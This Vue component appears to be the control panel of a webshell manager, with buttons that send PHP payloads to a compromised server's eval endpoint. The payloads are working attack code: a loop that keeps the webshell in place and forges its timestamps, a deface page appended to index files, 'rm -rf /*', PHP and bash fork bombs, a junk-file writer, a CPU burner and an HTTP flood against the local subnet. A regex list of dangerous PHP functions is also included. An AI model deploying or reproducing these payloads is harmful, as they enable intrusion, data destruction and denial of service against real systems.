<script setup>
import { store } from '@/assets/store';
import { addPopup, postDataOrPopupError } from '@/assets/utils';
import { Base64 } from 'js-base64';
import { computed, ref } from 'vue';


const props = defineProps({
  session: String,
})

if (props.session) {
  store.session = props.session
} else {
  alert("Unknown error: no session selected")
}
const actionInput = ref("");
const actionResult = ref("")

async function postCode(code) {
  let result
  actionResult.value = ""
  try {
    result = await postDataOrPopupError(`/session/${props.session}/php_eval`, {
      code: code.replace("{action_input_base64}", Base64.encode(actionInput.value))
    })
  } catch (e) {
    addPopup("yellow", "Some scripts keep running", "This may cause timeout errors; don't worry")
    throw e
  }

  actionResult.value = result
  actionInput.value = ""
}

async function writeBlackPage(code, html) {
  if (actionInput.value == "") {
    actionResult.value = "Enter the message to show (e.g., 'Hacked by xxx')"
  } else {
    actionInput.value = ""
    await postCode(code.replace("HTML_B64", Base64.encode(html)));
  }
}

const blackPageHtml = computed(() => {
  const codeOrig = atob("ID8+CjxzY3JpcHQ+CiAgZnVuY3Rpb24gYWRkTm9pc3lUZXh0KCkgewogICAgZnVuY3Rpb24gc2V0UG9zKHRyYW5zaXRpb24pIHsKICAgICAgcC5zdHlsZSA9IGAKICAgICAgcG9zaXRpb246IGFic29sdXRlOwogICAgICB6LWluZGV4OiAxMTQ1MTQ7CiAgICAgIGZvbnQtc2l6ZTogNjBweDsKICAgICAgZm9udC1mYW1pbHk6ICdDb3VyaWVyIE5ldycsIG1vbm9zcGFjZTsKICAgICAgZm9udC13ZWlnaHQ6IGJvbGRlcjsKICAgICAgdG9wOiAke01hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqICh3aW5kb3cuaW5uZXJIZWlnaHQgLSAyMDApICsgd2luZG93LnBhZ2VZT2Zmc2V0KX1weDsKICAgICAgbGVmdDogJHtNYXRoLmZsb29yKE1hdGgucmFuZG9tKCkgKiAod2luZG93LmlubmVyV2lkdGggKiAwLjYpICsgd2luZG93LnBhZ2VYT2Zmc2V0KX1weDsKICAgICAgdHJhbnNpdGlvbjogYWxsICR7dHJhbnNpdGlvbiB8fCAiMnMifTsKICAgICAgYW5pbWF0aW9uOiBnbG93aW5nIDJzIGluZmluaXRlOwogICAgYAogICAgfQoKICAgIGZ1bmN0aW9uIHJlY1NldFBvcygpIHsKICAgICAgc2V0UG9zKCkKICAgICAgc2V0VGltZW91dChyZWNTZXRQb3MsIE1hdGguZmxvb3IoTWF0aC5yYW5kb20oKSAqIDEwMDAgKyAyMDAwKSkKICAgIH0KCiAgICBsZXQgcCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInAiKQogICAgbGV0IHN0eWxlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic3R5bGUiKQogICAgc3R5bGUudGV4dENvbnRlbnQgPSBgCiAgICBAa2V5ZnJhbWVzIGdsb3dpbmcgewogICAgICAwJSB7dGV4dC1zaGFkb3c6IDNweCAzcHggMnB4IHJnYigyNTUsIDAsIDApO30KICAgICAgMzMlIHt0ZXh0LXNoYWRvdzogM3B4IDNweCAycHggcmdiKDAsIDI1NSwgMCk7fQogICAgICA2NiUge3RleHQtc2hhZG93OiAzcHggM3B4IDJweCByZ2IoMCwgMCwgMjU1KTt9CiAgICAgIDEwMCUge3RleHQtc2hhZG93OiAzcHggM3B4IDJweCByZ2IoMjU1LCAwLCAwKTt9CiAgICB9CiAgICBgCiAgICBwLnRleHRDb250ZW50ID0gIkhBQ0tFRF9CWV9NRSIKICAgIHAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24gKCkgewogICAgICBzZXRQb3MoIjBzIikKICAgIH0pCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHApCiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHN0eWxlKQogICAgcmVjU2V0UG9zKCkKICB9CiAgZm9yIChsZXQgaSA9IDA7IGkgPCAxMDsgaSsrKSB7CiAgICBzZXRUaW1lb3V0KGFkZE5vaXN5VGV4dCwgaSAqIDUwMCkKICB9Cgo8L3NjcmlwdD4KPD9waHAg")
  return codeOrig.replace("HACKED_BY_ME", actionInput.value)
})


const helloWorldCode = `
$name = base64_decode('{action_input_base64}');
if($name == "") {
  echo "Hello, current timestamp is " . time();;
}else{
  echo "Hello, $name";
}
`

// 这里可能是在eval中执行，__FILE__的值不代表文件路径
const persistWebshell = `
ignore_user_abort(true);
set_time_limit(0);
@session_write_close();
$filepath = base64_decode('{action_input_base64}');

function deleteFolder($folder) {
  $files = glob($folder . '/*');
  foreach ($files as $file) {
    if (is_file($file)) {
      unlink($file);
    } elseif (is_dir($file)) {
      deleteFolder($file);
    }
  }
  rmdir($folder);
}

function main($filepath) {
  $code = file_get_contents($filepath);
  while (1) {
    if (is_dir($filepath)) {
      deleteFolder($filepath);
    }
    file_put_contents($filepath, $code);
    if(function_exists('touch')) {
      touch($filepath, strtotime('2023-10-01 12:00:00'));
    }else{
      system('touch -m -d "2023-10-01 12:00:00" ' . $filepath);
      system('chattr +i ' . $filepath . '2>/dev/null');
    }
    usleep(1000);
  }
}
if($filepath == "") {
  $filepath = $_SERVER['SCRIPT_FILENAME'];
}

if(!is_writable(dirname($filepath))) {
  echo "Folder ".dirname($filepath)." is not writable!";
}else if(!is_writable($filepath)) {
  echo "File ".$filepath." is not writable!";
}else{
  main($filepath);
}
`

const findWebshells = `
function scanFiles($folder, $file_regexp)
{
    $result = [];
    $files = glob($folder . '/*');
    foreach ($files as $file) {
        if (is_file($file) && preg_match($file_regexp, $file)) {
            array_push($result, $file);
        } elseif (is_dir($file)) {
            $result = array_merge($result, scanFiles($file,  $file_regexp));
        }
    }
    return $result;
}

$var_regexp = '@?\\$(\\[\\s*|\\s*\\]|\\{\\s*|\\s*\\}|\\$|@|[A-Za-z0-9._])+';
$comment_regexp = '(\\s|\\/\\*.*?\\*\\/)*';
$string_regexp = "('[^']+'" . '|"[^"]+")';

$regexp = "/(eval|system|array_map|exec|shell_exec|wofeiwo|system|shell|" .
    "webshell|assert|create_function|preg_replace|popen|pcntl_exec|ngel|" .
    "reDuh|passthru|php_nst|phpspy|proc_open|call_user_func(_array)?|unserialize|" .
    "ReflectionClass|ReflectionFunction|newInstanceArgs)\\\\(" .
    "|{$comment_regexp}{$var_regexp}{$comment_regexp}\\({$comment_regexp}.*{$comment_regexp}\\)" . # $aaa(xxx);
    "|{$string_regexp}\\^{$string_regexp}" . # string xor
    "|\\\\(({$string_regexp}\\\\.?)*{$string_regexp}\\\\)\\\\({$comment_regexp}.*{$comment_regexp}\\\\)" . # ("sys"."tem")(xxx)
    "/";
$found = false;
$filepath = base64_decode('{action_input_base64}');
if($filepath == "") {
  $filepath = $_SERVER['DOCUMENT_ROOT'];
}
if(!is_dir($filepath)) {
  echo $filepath . " is not a folder!";
}

foreach (scanFiles($filepath, "/php|php\\d|phtm|phtml|phar$/") as $filepath) {
  if (preg_match_all($regexp, file_get_contents($filepath), $matches)) {
    $found = true;
    $detected = "";
    foreach ($matches[0] as $match) {
      $detected = "    " . trim($match);
    }
    $display_filepath = json_encode($filepath);
    if(preg_match("/^[-_a-zA-Z0-9\\.\\/]+$/", $filepath)) {
      $display_filepath = $filepath;
    }
    echo $display_filepath . "\\n" . $detected . "\\n";
  }
}
if(!$found) {
  echo "No webshell found";
}
`

const writeTrashCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
while(1) {
  $fp = tmpfile();
  if ($fp) {
    fwrite($fp, uniqid());
    fclose($fp);
  }
}
`

const ddosCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
$myip = base64_decode('{action_input_base64}');
$content = "GET / HTTP/1.1\\r
Host: IP\\r
\\r";
if(!$myip) {
  echo ("Provide your local IP in the C segment; that IP will not be DDoSed");
}else{
  while(1) {
    for($i = 0; $i < 256; $i ++) {
      $targetip = long2ip((ip2long($myip) & 0xffffff00) + $i);
      if($targetip == $myip) {
        continue;
      }
      for($j = 0; $j < 1000; $j ++) {
        $socket = fsockopen($targetip, 80, $error_code, $error_message);
        if(!$socket) {
          break;
        }
        fwrite($socket, str_replace($targetip, "IP", $content));
        fclose($socket);
      }
    }
  }
}
`

const blackPageCode = `
$code = base64_decode('HTML_B64');
if(file_exists('index.html')) {
  if(file_put_contents('index.html', $code, FILE_APPEND)){
    echo "Writing to index.html...";
  }else{
    echo "Failed to write to index.html";
  }
}
if(file_exists('index.php')) {
  if(file_put_contents('index.php', $code, FILE_APPEND)){
    echo "Writing to index.php...";
  }else{
    echo "Failed to write to index.php";
  }
}
`

const phpForkBombCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
if(!function_exists('pcntl_fork')) {
  echo "pcntl_fork function not available!";
}else{
  while (1) {
    pcntl_fork();
  }
}
`

const bashForkBombCode = `
$code = 'x(){ x|x & };x';
system($code);
`

const rmRfCode = `
passthru('rm -rf /*', $ret);
echo "Completed, return code is $ret";
`

const phpCpuBombCode = `
ignore_user_abort(true);
set_time_limit(0);
session_write_close();
$content = file_get_contents("/proc/cpuinfo");
while (1) {
  $a = md5($content);
}
`

</script>

<template>
  <div class="actionmain">
    <div class="action-group">
      <p class="group-title shadow-box">
        Persistence
      </p>
      <div class="actions shadow-box">
        <button class="action" title="Check if the remote server is alive" @click="postCode(helloWorldCode)">
          Hello World (Test)
        </button>
        <button class="action" title="Persist current webshell, adjust file timestamps. Enter other file path if needed"
          @click="postCode(persistWebshell)">
          Persist current webshell
        </button>
        <button class="action" title="Use regex to find all webshells on the server; optionally specify a folder"
          @click="postCode(findWebshells)">
          Scan and detect webshells
        </button>
      </div>
    </div>
    <div class="action-group">
      <p class="group-title shadow-box">
        One-click Chaos
      </p>
      <div class="actions shadow-box">
        <button class="action" title="Append content to index.html and index.php"
          @click="writeBlackPage(blackPageCode, blackPageHtml)">
          Add deface page
        </button>
        <button class="action" title="Continuously create temporary junk files" @click="postCode(writeTrashCode)">
          Write junk files
        </button>
        <button class="action" title="DDoS the current C segment" @click="postCode(ddosCode)">
          DDoS local network
        </button>
        <button class="action" title="Run rm -rf /*" @click="postCode(rmRfCode)">
          Run rm -rf
        </button>
        <button class="action" title="Call pcntl_fork to implement fork bomb" @click="postCode(phpForkBombCode)">
          Fork Bomb (PHP)
        </button>
        <button class="action" title="Use system() to call shell and implement fork bomb" @click="postCode(bashForkBombCode)">
          Fork Bomb (Shell)
        </button>
        <button class="action" title="Run md5(xxx) continuously; click many times" @click="postCode(phpCpuBombCode)">
          Max CPU (click multiple times)
        </button>
      </div>
    </div>
    <div class="action-input">
      <input type="text" class="shadow-box" v-model="actionInput" placeholder="Enter extra info here if required">
    </div>
    <textarea class="action-result shadow-box" v-model="actionResult" readonly>

  </textarea>

  </div>

</template>

<style scoped>
.actionmain {
  display: flex;
  flex-direction: column;
  align-items: center;
}

.action-group {
  display: flex;
  flex-direction: column;
  margin-bottom: 30px;
  width: 80%;
  margin-left: 20%;
  margin-right: 20%;
}

.group-title {
  background-color: var(--background-color-2);
  color: var(--font-color-primary);
  width: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 1.5rem;
  margin: 0;
  padding-top: 1rem;
  padding-bottom: 1rem;
  border-radius: 1rem;
  margin-bottom: 10px;
}

.actions {
  background-color: var(--background-color-2);
  width: 100%;
  border-radius: 1rem;
  margin-top: 20px;
  flex-grow: 1;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(12rem, 1fr));
  grid-gap: 20px;
  padding: 20px;
}

.action {
  background-color: var(--background-color-3);
  color: var(--font-color-primary);
  padding: 0.8rem;
  min-height: 5rem;
  outline: none;
  border: none;
  border-radius: 20px;
  font-size: 1rem;
}

.action:hover {
  opacity: 0.9;
}

.action-input {
  width: 80%;
  display: flex;
  flex-direction: column;
  align-items: center;
}

.action-input input {
  width: 100%;
  height: 2.3rem;
  background-color: var(--background-color-2);
  outline: none;
  border: none;
  border-radius: 20px;
  font-size: 1rem;
  color: var(--font-color-primary);
  padding-left: 15px;
  padding-right: 15px;
  margin-bottom: 30px;

}


.action-result {
  width: 80%;
  height: 100%;
  min-height: 20rem;
  box-sizing: border-box;
  resize: none;

  background-color: var(--background-color-2);
  outline: none;
  border: none;
  border-radius: 20px;
  margin-bottom: 2rem;

  font-size: 1rem;
  color: var(--font-color-primary);
  padding: 10px;
}
</style>
